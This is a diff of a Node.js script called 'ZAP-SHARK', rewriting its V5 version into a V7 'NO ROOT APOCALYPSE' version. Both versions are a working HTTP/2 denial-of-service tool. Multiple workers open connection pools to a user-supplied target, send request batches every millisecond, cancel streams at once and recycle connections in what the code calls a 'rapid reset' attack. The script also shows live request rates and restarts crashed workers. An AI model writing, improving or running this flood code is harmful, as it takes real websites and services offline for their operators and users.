@@ -1,325 +1,318 @@
-const http2 = require('http2');
+// ZAP-SHARK V7 - NO ROOT APOCALYPSE
+const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 const os = require('os');
-const cluster = require('cluster');
+const { performance } = require('perf_hooks');
 
-if (cluster.isMaster) {
-    console.log('=== ZAP-SHARK V5 HYBRID CORE SYSTEM ===');
-    console.log('Target:', process.argv[2] || 'https://target.com');
-    console.log('CPU Cores:', os.cpus().length);
-    console.log('Hybrid Setup: 6 Cores (4x500ms + 2x1ms)');
+// ==================== MAIN THREAD ====================
+if (isMainThread) {
+    const targetUrl = process.argv[2] || 'https://example.com';
+    
+    console.log('=== ZAP-SHARK V7 - NO ROOT APOCALYPSE ===');
+    console.log('Target:', targetUrl);
+    console.log('CPU Threads:', os.cpus().length);
+    console.log('Arch:', os.arch(), '| Platform:', os.platform());
     console.log('='.repeat(60));
     
-    const hybridConfig = [
-        // CORE 0-3: RAPID RESET 500ms (SUSTAINED POWER)
-        { type: 'RAPID', id: 0, resetInterval: 500, connections: 10, burst: false },
-        { type: 'RAPID', id: 1, resetInterval: 500, connections: 10, burst: false },
-        { type: 'APID', id: 2, resetInterval: 500, connections: 10, burst: false },
-        { type: 'RAPID', id: 3, resetInterval: 500, connections: 10, burst: false },
-        
-        // CORE 4-5: HYPER RESET 1ms (BURST CYCLE)
-        { type: 'HYPER', id: 4, resetInterval: 1, connections: 20, burst: true, cycle: '15s ON / 10s OFF' },
-        { type: 'HYPER', id: 5, resetInterval: 1, connections: 20, burst: true, cycle: '15s ON / 10s OFF' }
-    ];
+    // AUTO-TUNE WORKER COUNT
+    const maxWorkers = Math.min(16, os.cpus().length * 2);
+    const workers = [];
+    let totalRequests = 0;
+    let peakRPS = 0;
+    let currentRPS = 0;
+    const startTime = Date.now();
+    let lastStatsUpdate = Date.now();
     
-    const sharedStats = {
-        totalRequests: 0,
-        currentRPS: 0,
-        peakRPS: 0,
-        startTime: Date.now(),
-        rapidCores: 0,
-        hyperCores: 0
-    };
+    console.log(`[+] Launching ${maxWorkers} ultra-threads`);
     
-    // LAUNCH HYBRID WORKERS
-    hybridConfig.forEach(config => {
-        const worker = cluster.fork({
-            WORKER_TYPE: config.type,
-            WORKER_ID: config.id,
-            RESET_INTERVAL: config.resetInterval,
-            CONNECTIONS: config.connections,
-            BURST_MODE: config.burst,
-            TARGET_URL: process.argv[2]
-        });
-        
-        worker.on('message', (msg) => {
-            if (msg.type === 'stats') {
-                sharedStats.totalRequests += msg.requests;
-                sharedStats.currentRPS += msg.rps;
-                sharedStats.peakRPS = Math.max(sharedStats.peakRPS, sharedStats.currentRPS);
-                
-                if (msg.workerType === 'RAPID') sharedStats.rapidCores++;
-                if (msg.workerType === 'HYPER') sharedStats.hyperCores++;
+    // CREATE WORKER THREADS
+    for (let i = 0; i < maxWorkers; i++) {
+        const worker = new Worker(__filename, {
+            workerData: {
+                workerId: i,
+                targetUrl: targetUrl,
+                maxConnections: 4, // Minimal per worker
+                rapidResetMS: 500  // VIP reset
             }
         });
-    });
-    
-    // DISPLAY
-    setInterval(() => {
-        const runtime = Math.floor((Date.now() - sharedStats.startTime) / 1000);
-        const hours = Math.floor(runtime / 3600);
-        const minutes = Math.floor((runtime % 3600) / 60);
-        const seconds = runtime % 60;
-        const runtimeStr = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
         
-        const rapidRPS = sharedStats.currentRPS * 0.6; // 60% from rapid cores
-        const hyperRPS = sharedStats.currentRPS * 0.4; // 40% from hyper cores
-        const estimatedHyperBurst = hyperRPS * 2.5; // Hyper cores burst 2.5x when active
+        worker.on('message', (stats) => {
+            totalRequests += stats.requestsDelta || 0;
+            currentRPS += stats.currentRPS || 0;
+            peakRPS = Math.max(peakRPS, currentRPS);
+        });
+        
+        worker.on('error', (err) => {
+            console.log(`[!] Worker ${i} error: ${err.message}`);
+        });
+        
+        worker.on('exit', (code) => {
+            if (code !== 0) {
+                console.log(`[!] Worker ${i} crashed, restarting...`);
+                // Auto-restart
+                setTimeout(() => {
+                    workers[i] = new Worker(__filename, {
+                        workerData: {
+                            workerId: i,
+                            targetUrl: targetUrl
+                        }
+                    });
+                }, 1000);
+            }
+        });
+        
+        workers.push(worker);
+    }
+    
+    // REAL-TIME DISPLAY
+    const displayInterval = setInterval(() => {
+        const runtime = Date.now() - startTime;
+        const hours = Math.floor(runtime / 3600000);
+        const minutes = Math.floor((runtime % 3600000) / 60000);
+        const seconds = Math.floor((runtime % 60000) / 1000);
+        
+        const memoryMB = Math.round(process.memoryUsage().heapUsed / 1024 / 1024);
+        const workersAlive = workers.filter(w => w.threadId).length;
+        
+        // Calculate actual RPS
+        const timeDiff = (Date.now() - lastStatsUpdate) / 1000;
+        const actualRPS = Math.round((totalRequests / (runtime / 1000)) * 10) / 10;
         
         process.stdout.write('\x1B[2J\x1B[0f');
-        console.log(`=== ZAP-SHARK V5 HYBRID CORE ===`);
-        console.log(`RUNTIME: ${runtimeStr} | CORES: 6/6 (4RAPID + 2HYPER)`);
+        console.log(`=== ZAP-SHARK V7 - REAL-TIME STATS ===`);
+        console.log(`RUNTIME: ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`);
+        console.log(`WORKERS: ${workersAlive}/${maxWorkers} | MEM: ${memoryMB}MB`);
         console.log('='.repeat(60));
-        console.log(`TOTAL REQUESTS: ${sharedStats.totalRequests.toLocaleString()}`);
-        console.log(`COMBINED RPS: ${sharedStats.currentRPS.toFixed(1)} | PEAK: ${sharedStats.peakRPS.toFixed(1)}`);
-        console.log(`RAPID CORES (500ms): ${rapidRPS.toFixed(1)} RPS`);
-        console.log(`HYPER CORES (1ms): ${hyperRPS.toFixed(1)} RPS (${estimatedHyperBurst.toFixed(1)} during burst)`);
+        console.log(`TOTAL REQUESTS: ${totalRequests.toLocaleString()}`);
+        console.log(`REAL-TIME RPS: ${actualRPS.toFixed(1)}`);
+        console.log(`PEAK RPS: ${peakRPS.toFixed(1)}`);
+        console.log(`REQ/SEC PER WORKER: ${(actualRPS / workersAlive || 1).toFixed(1)}`);
         console.log('='.repeat(60));
-        console.log('CYCLE STATUS:');
-        console.log('├── Rapid Cores (0-3): CONSTANT ATTACK');
-        console.log('├── Hyper Core 4: 15s ON / 10s OFF');
-        console.log('└── Hyper Core 5: 15s ON / 10s OFF (staggered)');
+        console.log('SYSTEM:');
+        console.log(`CPU: ${os.loadavg()[0].toFixed(2)} | Threads: ${performance.eventLoopUtilization().utilization.toFixed(2)}`);
+        console.log(`Network: Active | Reset: 500ms VIP`);
         console.log('='.repeat(60));
         
-        sharedStats.currentRPS = 0;
-        sharedStats.rapidCores = 0;
-        sharedStats.hyperCores = 0;
+        // Reset for next interval
+        currentRPS = 0;
+        lastStatsUpdate = Date.now();
     }, 1000);
     
-} else {
-// ==================== WORKER IMPLEMENTATION ====================
-const WORKER_TYPE = process.env.WORKER_TYPE;
-const WORKER_ID = parseInt(process.env.WORKER_ID);
-const RESET_INTERVAL = parseInt(process.env.RESET_INTERVAL);
-const CONNECTIONS = parseInt(process.env.CONNECTIONS);
-const BURST_MODE = process.env.BURST_MODE === 'true';
-const TARGET_URL = process.env.TARGET_URL;
-
-class HybridWorker {
-    constructor() {
-        this.type = WORKER_TYPE; // 'RAPID' or 'HYPER'
-        this.id = WORKER_ID;
-        this.resetInterval = RESET_INTERVAL;
-        this.connections = CONNECTIONS;
-        this.burstMode = BURST_MODE;
-        this.targetUrl = TARGET_URL;
-        this.hostname = new URL(TARGET_URL).hostname;
+    // CLEANUP
+    process.on('SIGINT', () => {
+        clearInterval(displayInterval);
         
+        console.log('\n\n=== FINAL V7 STATISTICS ===');
+        console.log(`Total Runtime: ${Math.round((Date.now() - startTime) / 1000)}s`);
+        console.log(`Total Requests: ${totalRequests.toLocaleString()}`);
+        console.log(`Average RPS: ${(totalRequests / ((Date.now() - startTime) / 1000)).toFixed(1)}`);
+        console.log(`Peak RPS: ${peakRPS.toFixed(1)}`);
+        console.log(`Memory Used: ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)}MB`);
+        console.log(`Workers Completed: ${workers.length}`);
+        console.log('='.repeat(40));
+        console.log('APOCALYPSE COMPLETE 🦈');
+        
+        workers.forEach(worker => {
+            try {
+                worker.postMessage('TERMINATE');
+                worker.terminate();
+            } catch (e) {}
+        });
+        
+        setTimeout(() => process.exit(0), 1000);
+    });
+    
+} else {
+// ==================== WORKER THREAD ====================
+const http2 = require('http2');
+
+class V7Worker {
+    constructor(config) {
+        this.workerId = config.workerId;
+        this.targetUrl = config.targetUrl;
+        this.hostname = new URL(config.targetUrl).hostname;
+        this.maxConnections = config.maxConnections || 4;
+        this.rapidResetMS = config.rapidResetMS || 500;
+        
+        this.connectionPool = [];
         this.totalRequests = 0;
         this.currentRPS = 0;
-        this.requestsSinceLastCalc = 0;
-        this.lastRpsCalc = Date.now();
+        this.requestsSinceLastReport = 0;
+        this.lastReportTime = Date.now();
+        this.lastResetTime = Date.now();
         
-        // HYPER CORE CYCLE CONTROL
-        this.burstActive = this.type === 'RAPID'; // Rapid always active
-        this.burstStartTime = Date.now();
-        this.burstDuration = 15000; // 15 seconds ON
-        this.cooldownDuration = 10000; // 10 seconds OFF
-        this.lastCycleChange = Date.now();
+        this.running = true;
         
-        // CONNECTION SYSTEM
-        this.connectionPool = [];
-        this.lastConnectionReset = Date.now();
-        
-        // PERFORMANCE TRACKING
-        this.peakWorkerRPS = 0;
-        this.burstCount = 0;
+        // OPTIMIZED HEADERS (MINIMAL)
+        this.headers = {
+            ':method': 'GET',
+            ':path': '/',
+            ':authority': this.hostname,
+            'user-agent': `ZAP-V7/${this.workerId}`
+        };
         
         this.init();
     }
     
     init() {
-        console.log(`[${this.type} Core ${this.id}] Initializing - Reset: ${this.resetInterval}ms`);
-        
-        // BUILD CONNECTION POOL BASED ON TYPE
-        for (let i = 0; i < this.connections; i++) {
+        // BUILD MINIMAL CONNECTION POOL
+        for (let i = 0; i < this.maxConnections; i++) {
             this.createConnection();
         }
         
-        // START ATTACK SYSTEM
-        setTimeout(() => {
-            this.startAttackLoop();
-            
-            // BURST CYCLE FOR HYPER CORES
-            if (this.type === 'HYPER') {
-                this.startBurstCycle();
-            }
-        }, this.id * 200); // Stagger starts
+        // START ATTACK LOOP
+        this.startAttack();
         
-        // STATS REPORTING
-        setInterval(() => this.reportStats(), 1000);
+        // START STATS REPORTING
+        setInterval(() => this.reportStats(), 900);
     }
     
     createConnection() {
         try {
             const client = http2.connect(this.targetUrl, {
-                maxSessionMemory: this.type === 'HYPER' ? 16384 : 8192,
-                maxDeflateDynamicTableSize: this.type === 'HYPER' ? 65536 : 4096
+                maxSessionMemory: 4096, // ULTRA LOW MEMORY
+                maxDeflateDynamicTableSize: 2048
             });
             
-            client.setMaxListeners(this.type === 'HYPER' ? 500 : 100);
+            client.on('error', () => {
+                // SILENT FAIL - WILL BE RECYCLED
+            });
             
-            this.connectionPool.push({
+            const conn = {
                 client,
-                created: Date.now(),
+                id: Math.random().toString(36).substr(2, 6),
+                createdAt: Date.now(),
                 requestCount: 0,
-                lastReset: Date.now()
-            });
+                lastUsed: Date.now()
+            };
             
+            this.connectionPool.push(conn);
+            return conn;
         } catch (err) {
-            // SILENT
+            return null;
         }
     }
     
-    // TYPE-SPECIFIC RAPID RESET
-    performReset() {
+    // VIP RAPID RESET - 500ms
+    performRapidReset() {
         const now = Date.now();
-        if (now - this.lastConnectionReset >= this.resetInterval) {
-            const resetPercent = this.type === 'HYPER' ? 0.5 : 0.3;
-            const resetCount = Math.ceil(this.connectionPool.length * resetPercent);
+        if (now - this.lastResetTime >= this.rapidResetMS) {
+            // RECYCLE 30% OF CONNECTIONS
+            const recycleCount = Math.ceil(this.connectionPool.length * 0.3);
             
-            for (let i = 0; i < resetCount; i++) {
+            for (let i = 0; i < recycleCount; i++) {
                 const index = Math.floor(Math.random() * this.connectionPool.length);
                 const conn = this.connectionPool[index];
                 
-                if (conn && (conn.requestCount > 500 || this.type === 'HYPER')) {
+                if (conn && conn.requestCount > 100) {
                     try {
                         conn.client.destroy();
-                        this.createConnection();
                         this.connectionPool.splice(index, 1);
+                        this.createConnection(); // Replace immediately
                     } catch (err) {}
                 }
             }
             
-            this.lastConnectionReset = now;
+            this.lastResetTime = now;
         }
     }
     
-    // HYPER CORE BURST CYCLE
-    startBurstCycle() {
-        // STAGGER HYPER CORES (Core 4 immediate, Core 5 delayed)
-        const initialDelay = this.id === 4 ? 0 : 7500; // 7.5s offset
-        
-        setTimeout(() => {
-            const cycleLoop = () => {
-                const now = Date.now();
-                const timeInCycle = (now - this.lastCycleChange) % (this.burstDuration + this.cooldownDuration);
-                
-                if (timeInCycle < this.burstDuration) {
-                    // BURST ACTIVE
-                    if (!this.burstActive) {
-                        this.burstActive = true;
-                        this.burstStartTime = now;
-                        this.burstCount++;
-                        console.log(`[Hyper Core ${this.id}] BURST ACTIVATED`);
-                    }
-                } else {
-                    // COOLDOWN
-                    if (this.burstActive) {
-                        this.burstActive = false;
-                        this.lastCycleChange = now;
-                        console.log(`[Hyper Core ${this.id}] COOLDOWN STARTED`);
-                        
-                        // REDUCE CONNECTIONS DURING COOLDOWN
-                        this.connectionPool.forEach(conn => {
-                            try { conn.client.destroy(); } catch (e) {}
-                        });
-                        this.connectionPool = [];
-                    }
-                    
-                    // REBUILD CONNECTIONS BEFORE NEXT BURST
-                    if (timeInCycle > this.cooldownDuration * 0.8) {
-                        if (this.connectionPool.length < this.connections) {
-                            this.createConnection();
-                        }
-                    }
-                }
-                
-                setTimeout(cycleLoop, 100);
-            };
-            
-            cycleLoop();
-        }, initialDelay);
-    }
-    
-    // ATTACK LOOP
-    startAttackLoop() {
-        const attackInterval = setInterval(() => {
-            if (!this.burstActive && this.type === 'HYPER') return;
-            
-            // TYPE-SPECIFIC BATCH SIZE
-            const batchSize = this.type === 'HYPER' ? 15 : 5;
-            
-            for (let i = 0; i < batchSize; i++) {
-                this.sendRequest();
-            }
-            
-            // PERFORM RESET
-            this.performReset();
-            
-            // CALCULATE RPS
-            const now = Date.now();
-            const timeDiff = (now - this.lastRpsCalc) / 1000;
-            
-            if (timeDiff >= 0.9) {
-                this.currentRPS = this.requestsSinceLastCalc / timeDiff;
-                this.peakWorkerRPS = Math.max(this.peakWorkerRPS, this.currentRPS);
-                this.requestsSinceLastCalc = 0;
-                this.lastRpsCalc = now;
-            }
-        }, this.type === 'HYPER' ? 0.5 : 1); // Hyper: 0.5ms, Rapid: 1ms
-    }
-    
-    sendRequest() {
+    // ULTRA-OPTIMIZED REQUEST
+    sendRequestBatch() {
         if (this.connectionPool.length === 0) return;
         
-        const streamsThisTick = this.type === 'HYPER' ? 25 : 10;
+        // USE SMALL BATCH FOR MEMORY EFFICIENCY
+        const batchSize = Math.min(8, this.connectionPool.length * 2);
         
-        for (let i = 0; i < streamsThisTick; i++) {
-            const conn = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
+        for (let i = 0; i < batchSize; i++) {
+            const conn = this.connectionPool[
+                Math.floor(Math.random() * this.connectionPool.length)
+            ];
+            
             if (!conn) continue;
             
             try {
-                const req = conn.client.request({
-                    ':method': 'GET',
-                    ':path': `/?core=${this.type.toLowerCase()}&id=${this.id}&t=${Date.now()}`,
-                    ':authority': this.hostname,
-                    'x-core-type': this.type,
-                    'x-core-id': this.id.toString()
-                });
-                
+                const req = conn.client.request(this.headers);
                 conn.requestCount++;
+                conn.lastUsed = Date.now();
                 
-                req.on('response', () => req.destroy());
-                req.on('error', () => req.destroy());
-                req.on('close', () => {
+                // ZERO-MEMORY EVENT HANDLERS
+                const cleanup = () => {
                     this.totalRequests++;
-                    this.requestsSinceLastCalc++;
-                });
+                    this.requestsSinceLastReport++;
+                    try { req.destroy(); } catch (e) {}
+                };
+                
+                req.on('response', cleanup);
+                req.on('error', cleanup);
+                req.on('close', cleanup);
                 
                 req.end();
+                
             } catch (err) {
                 this.totalRequests++;
-                this.requestsSinceLastCalc++;
+                this.requestsSinceLastReport++;
             }
         }
+        
+        // PERFORM VIP RESET
+        this.performRapidReset();
+    }
+    
+    startAttack() {
+        // HIGH FREQUENCY, SMALL BATCHES
+        const attackInterval = setInterval(() => {
+            if (!this.running) {
+                clearInterval(attackInterval);
+                return;
+            }
+            
+            // SEND 3 BATCHES PER TICK
+            for (let i = 0; i < 3; i++) {
+                this.sendRequestBatch();
+            }
+            
+            // CALCULATE RPS
+            const now = Date.now();
+            const timeDiff = (now - this.lastReportTime) / 1000;
+            
+            if (timeDiff >= 0.9) {
+                this.currentRPS = this.requestsSinceLastReport / timeDiff;
+                this.requestsSinceLastReport = 0;
+                this.lastReportTime = now;
+            }
+            
+        }, 1); // 1ms INTERVAL
     }
     
     reportStats() {
-        if (process.send) {
-            process.send({
-                type: 'stats',
-                workerType: this.type,
-                workerId: this.id,
-                requests: this.totalRequests,
-                rps: this.currentRPS,
-                peakRps: this.peakWorkerRPS,
+        if (parentPort) {
+            parentPort.postMessage({
+                workerId: this.workerId,
+                requestsDelta: this.requestsSinceLastReport,
+                currentRPS: this.currentRPS,
                 connections: this.connectionPool.length,
-                burstActive: this.burstActive,
-                burstCount: this.burstCount
+                totalRequests: this.totalRequests
             });
         }
     }
+    
+    terminate() {
+        this.running = false;
+        this.connectionPool.forEach(conn => {
+            try { conn.client.destroy(); } catch (e) {}
+        });
+    }
 }
 
-new HybridWorker();
+// START WORKER
+const worker = new V7Worker(workerData);
+
+// LISTEN FOR TERMINATION
+if (parentPort) {
+    parentPort.on('message', (msg) => {
+        if (msg === 'TERMINATE') {
+            worker.terminate();
+        }
+    });
+}
 }
